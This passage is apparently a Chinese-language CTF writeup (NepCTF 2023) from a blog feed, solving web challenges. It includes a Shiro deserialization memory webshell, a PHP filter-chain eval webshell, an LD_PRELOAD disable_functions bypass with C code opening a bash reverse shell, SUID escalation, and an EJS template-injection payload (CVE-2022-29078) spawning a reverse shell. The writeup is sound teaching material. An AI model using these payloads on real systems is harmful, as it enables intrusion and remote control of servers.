class="line">NepCTF&#123;HRP_always_likes_March_7th&#125;</span><br></pre></td></tr></table></figure><h1>web</h1><h2 id="Ezjava-Chekin">Ezjava_Chekin</h2><p><a href="https://blog.csdn.net/dreamthe/article/details/124390531?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=shiro_attack-4.7.0-SNAPSHOT-al&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-124390531.142%5Ev92%5Ekoosearch_v1&amp;spm=1018.2226.3001.4187">详细shiro漏洞复现及利用方法（CVE-2016-4437）</a></p><p>直接利用shiro反序列化工具一把梭</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191401318-584320209.png" alt="image-20240607191359010"></p><p>注入内存马（换jsp类型）</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191411410-747375604.png" alt="image-20240607191409148"></p><p>连接成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191416770-1165957202.png" alt="image-20240607191414424"></p><p><a href="http://xn--start-tw3kv98f.sh">查看start.sh</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191422311-1273897623.png" alt="image-20240607191420079"></p><h2 id="Ez-include">Ez_include</h2><p>进入页面，有如下界面</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191442495-1317549732.png" alt="image-20240607191440315"></p><p>将<code>?</code>后面的内容删去后方访问：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191450697-526892477.png" alt="image-20240607191448460"></p><p>提示让我们访问<code>/jump.php?hint</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191457513-892001261.png" alt="image-20240607191455085"></p><p>发现这是一个文件包含，且加后缀<code>.txt</code>，在注释里提示可以访问<code>hint.ini</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191503283-697759397.png" alt="image-20240607191501073"></p><p>发现远程文件包含利用不了，提示里有一篇文章：<a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>可以在github上找到利用脚本：<a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain <span class="string">&quot;&lt;?php eval(<span class="variable">$_POST</span>[1]);?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191514739-1208798047.png" alt="image-20240607191512382"></p><p>这样就成功了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191518322-1944982368.png" alt="image-20240607191515814"></p><p>但是查看一下<code>disable_functions、disable_classes</code> 把很多的函数和类给禁用了,还限制了<code>open_basedir=/var/www/html:/tmp</code></p><p>所以我们需要想办法 <code>php disable_function bypass</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191538245-1265049974.png" alt="image-20240607191536009"></p><p><strong>劫持LD_PRELOAD绕过disable_functions</strong></p><blockquote><p>LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用</p><p>劫持步骤：</p><ol><li>生成一个我们的恶意动态链接库文件</li><li>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li><li>配合php的某个函数去触发我们的恶意动态链接库文件</li><li>Getshell</li></ol></blockquote><p>这个php的函数很关键。可以使用<code>mail、error_log</code>等，但是这里被禁用了</p><p>我们还可以使用<code>mb_send_mail()</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191545005-427713125.png" alt="image-20240607191542830"></p><p>它是<code>mail()</code>的包装函数，因此也可以进行劫持</p><p>我们需要先编写一个恶意poc.c文件：(用来反弹shell)</p><blockquote><p>__attribute__语法格式为：<strong>attribute</strong> ( ( attribute-list ) )<br>若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，<br>则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">angel</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vpsip/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译一下生成恶意动态链接程序<code>poc.so</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC poc.c -o poc</span><br><span class="line">gcc --share poc -o poc.so</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191554006-1255129554.png" alt="image-20240607191551703"></p><p>然后需要把这个文件给上传到服务器上去，并且使用<code>putenv()</code>函数重新设置<code>LD_PRELOAD</code>环境变量，最后使用<code>mb_send_mail()</code>调用恶意的函数进行反弹shell</p><p>但是这里有个问题，我们没权限上传文件和写文件，相关函数被禁用了。</p><p>这里有一种方法是上传临时文件<code>/tmp/phpxxx</code>，然后使用<code>scandir(&quot;glob:///tmp/php*&quot;)</code>去模糊匹配的</p><p>在本地写一个上传文件的<code>html</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;url&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>  <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    &lt;<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将恶意的<code>.so</code>文件上传并抓包，将数据包下面内容进行更改：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;/tmp&#x27;</span>));<span class="variable">$a</span>=scandir(<span class="string">&quot;glob:///tmp/php*&quot;</span>);<span class="variable">$filename</span>=<span class="string">&quot;/tmp/&quot;</span>.<span class="variable">$a</span>[0];var_dump(<span class="variable">$filename</span>);putenv(<span class="string">&quot;LD_PRELOAD=<span class="variable">$filename</span>&quot;</span>);mb_send_mail(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191603773-362245868.png" alt="image-20240607191601339"></p><p>发送后，可以看到，反弹shell成功了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191617064-2120297057.png" alt="image-20240607191614906"></p><p>利用的是php产生的临时文件，而这个临时文件的文件名是<strong>随机</strong>的，因此用<strong>glob伪协议</strong>去锁定。然后劫持</p><p>触发LD_PRELOAD的函数，常见的2个<code>mail、error_log</code>都可以触发系统函数<code>send_mail</code>进而触发LD劫持，但是这里ban了这2个函数，因此还有个替代品<code>mb_send_mail</code>最后RCE</p><p>在根目录下查看到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191630804-1894573378.png" alt="image-20240607191628575"></p><p>但是发现没有权限：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191637136-1283389099.png" alt="image-20240607191634986"></p><p>用环境变量提权。因为我们有一个suid的二进制文件<code>showmsg</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191644575-741172198.png" alt="image-20240607191642261">提权成功，然后给777权限给flag，直接读就好了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191654692-265270369.png" alt="image-20240607191652430"></p><h2 id="Post-Crad-For-You">Post Crad For You</h2><p>先拿到题目代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line">templateDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;template&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;template&#x27;</span>, templateDir);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">milliSeconds</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">StartTime</span> =<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>() &lt;<span class="title class_">StartTime</span>+milliSeconds);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(<span class="string">&#x27;./index.html&#x27;</span>, &#123;<span class="attr">root</span>: __dirname&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/create&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> uuid;</span><br><span class="line">    <span class="keyword">let</span> name = req.<span class="property">query</span>.<span class="property">name</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> address = req.<span class="property">query</span>.<span class="property">address</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> message = req.<span class="property">query</span>.<span class="property">message</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">    &#125; <span class="keyword">while</span> (fs.<span class="title function_">existsSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name != <span class="string">&#x27;&#x27;</span> &amp;&amp; address != <span class="string">&#x27;&#x27;</span> &amp;&amp; message != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> source = [<span class="string">&quot;source&quot;</span>, <span class="string">&quot;source1&quot;</span>, <span class="string">&quot;source2&quot;</span>, <span class="string">&quot;source3&quot;</span>].<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0.5</span> - <span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line">            &#125;)</span><br><span class="line">            fs.<span class="title function_">readFile</span>(source[<span class="number">0</span>]+<span class="string">&quot;.html&quot;</span>, <span class="string">&#x27;utf8&#x27;</span>,<span class="keyword">function</span>(<span class="params">err, pageContent</span>)&#123;</span><br><span class="line">                fs.<span class="title function_">writeFileSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, pageContent.<span class="title function_">replace</span>(<span class="regexp">/--ID--/g</span>, uuid.<span class="title function_">replace</span>(<span class="regexp">/-/g</span>, <span class="string">&quot;&quot;</span>)));</span><br><span class="line">                <span class="title function_">sleep</span>(<span class="number">2000</span>);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Params `name` or `address` or `message` empty&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/page?pageid=<span class="subst">$&#123;uuid&#125;</span>&amp;name=<span class="subst">$&#123;name&#125;</span>&amp;address=<span class="subst">$&#123;address&#125;</span>&amp;message=<span class="subst">$&#123;message&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/page&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> id = req.<span class="property">query</span>.<span class="property">pageid</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="title function_">test</span>(id) || !fs.<span class="title function_">existsSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;id&#125;</span>.ejs`</span>)) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&quot;Sorry, no such id&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;id&#125;</span>.ejs`</span>, req.<span class="property">query</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>发现<code>res.render(`$&#123;templateDir&#125;/$&#123;id&#125;.ejs`, req.query);</code>这段有模板注入的，他把query放进去render了。</p><p>网上是有关于这个的CVE：<a href="https://inhann.top/2023/03/26/ejs/">CVE-2022-29078</a></p><p><strong>payload：</strong></p><p>在url后加入：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;settings[view options][escapeFunction]=console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&quot;bash%20-c%20&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%20%3C%261&#x27;&quot;);&amp;settings[view options][client]=true</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191716473-2064343561.png" alt="image-20240607191713978"></p><p>反弹shell成功！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191726007-1545553940.png" alt="image-20240607191723486"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191731934-1706873529.png" alt="image-20240607191729610"></p>]]></content>
    
    
    <summary type="html">NepCTF 2023 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://www.fomal.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.fomal.cc/tags/CTF/"/>
    
    <category term="Competition" scheme="https://www.fomal.cc/tags/Competition/"/>
    
  </entry>
  
</feed>
